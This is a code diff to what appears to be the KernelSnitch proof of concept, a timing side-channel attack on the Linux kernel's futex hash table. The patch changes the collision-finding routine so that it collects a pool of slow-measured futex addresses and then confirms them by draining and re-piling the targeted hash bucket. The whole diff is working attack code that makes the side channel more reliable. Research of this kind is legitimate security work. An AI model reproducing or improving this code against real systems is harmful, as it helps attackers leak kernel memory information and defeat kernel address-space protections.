@@ -302,6 +302,9 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
+#ifndef KERNELSNITCH_COLLISION_POOL
+#define KERNELSNITCH_COLLISION_POOL 64
+#endif
     size_t count = 0;
     size_t wanted;
     size_t futex_addr;
@@ -320,7 +323,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
-    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+    /* pool of slow candidates, verified below */
+    typedef struct { size_t t, addr; } coll_cand_t;
+    coll_cand_t *best = calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t));
+    ASSERT_pr(best, "calloc best\n");
+    for (size_t i = 2; i < ks->total_futexes; ++i) {
         if (ks->verbose && (i % 256) == 0)
             pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
         id = (i*4096) | (i*8 % 4096);
@@ -330,11 +337,50 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->scan_done = i;
         ks->times[i] = __measure(futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-            count++;
-            ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+            size_t pos = KERNELSNITCH_COLLISION_POOL;
+            for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL; ++j) {
+                if (ks->times[i] > best[j].t) { pos = j; break; }
+            }
+            if (pos < KERNELSNITCH_COLLISION_POOL) {
+                for (size_t j = KERNELSNITCH_COLLISION_POOL - 1; j > pos; --j)
+                    best[j] = best[j-1];
+                best[pos].t = ks->times[i];
+                best[pos].addr = futex_addr;
+            }
         }
     }
+    /* pass 1: drain the pile; piled-bucket colliders collapse, ambient
+       buckets stay slow */
+    __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+    usleep(200000);
+    size_t alive[KERNELSNITCH_COLLISION_POOL];
+    size_t alive_t[KERNELSNITCH_COLLISION_POOL];
+    size_t n_alive = 0;
+    if (ks->verbose) pr_info("verifying %d candidates after pile drain\n", KERNELSNITCH_COLLISION_POOL);
+    for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL && best[j].t; ++j) {
+        size_t t2 = __measure(best[j].addr);
+        if (t2 < best[j].t / 2) {
+            alive[n_alive] = best[j].addr;
+            alive_t[n_alive] = best[j].t;
+            n_alive++;
+            if (ks->verbose) pr_info("  drained  %016zx t=%zu after=%zu\n", best[j].addr, best[j].t, t2);
+        } else if (ks->verbose) {
+            pr_info("  reject   %016zx t=%zu after=%zu\n", best[j].addr, best[j].t, t2);
+        }
+    }
+    /* pass 2: re-pile; only real colliders go slow again */
+    __increase(ks, ID, APPENDED_FUTEXES);
+    count = 0;
+    for (size_t j = 0; j < n_alive && count < wanted; ++j) {
+        size_t t3 = __measure(alive[j]);
+        if (t3 > approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+            ks->futex_addrs[++count] = alive[j];
+            if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
+        } else if (ks->verbose) {
+            pr_info("  reject   %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
+        }
+    }
+    free(best);
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
